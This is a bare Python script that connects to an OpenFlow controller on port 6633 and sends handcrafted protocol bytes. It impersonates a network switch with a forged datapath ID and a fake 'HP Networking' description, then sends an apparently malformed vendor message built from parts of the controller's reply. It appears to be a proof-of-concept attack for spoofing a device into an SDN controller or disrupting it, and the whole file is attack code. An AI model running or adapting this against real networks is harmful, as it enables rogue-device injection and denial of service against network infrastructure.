import socket
import time
dIP="10.0.0.201"
dPort=6633
dPID="\x00\x0a\xf0\x92\x1c\x21\x5d\x80"
ethMAC=dPID[2:8]
bridge_id="15"
port_id=bridge_id + ('\x00' * (16-len(bridge_id)))
none="None"
switchVendor="HP Networking"
switchType="BTTF"
switchVersion="VER 1.0"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((dIP,dPort))
resp=s.recv(2048)
s.send('\x01\x00\x00\x08' + resp[4:8])
resp=s.recv(2048)
s.send('\x01\x06\x00\x50' + resp[4:8] + dPID + '\x00\x00\x01\x00' + '\xfe' + ('\x00'*3) + '\x00\x00\x00\xc7' + '\x00\x00\x0f\xff' + '\xff\xfe' + ethMAC + port_id + ('\x00'*2) + '\x00\x01\x00\x00\x00\x01' + ('\x00' * 16))
s.recv(2048)
s.send('\01\x13\x00\x08\xff\xff\xff\xfc')
s.send('\x01\x08\x00\x0C' + '\xff\xff\xff\xfb' + ('\x00' * 2) + '\xff\xff')
resp = s.recv(2048)
s.send('\x01\x11\x04\x2c' + resp[4:8] +'\x00\x00\x00\x00' + switchVendor + ('\x00' * 244) + switchType + ('\x00' * 244) + switchVersion + ('\x00' * 251) + none + ('\x00' * 30) + none + ('\x00' * 252))
resp=s.recv(2048)
s.send('\x01\x02\x00\x08' + ('\x00' * 4))
s.send('\x01\x04\x00\x14' + resp[4:15] + '\x0b\x00\x00\x00\x01')
s.close()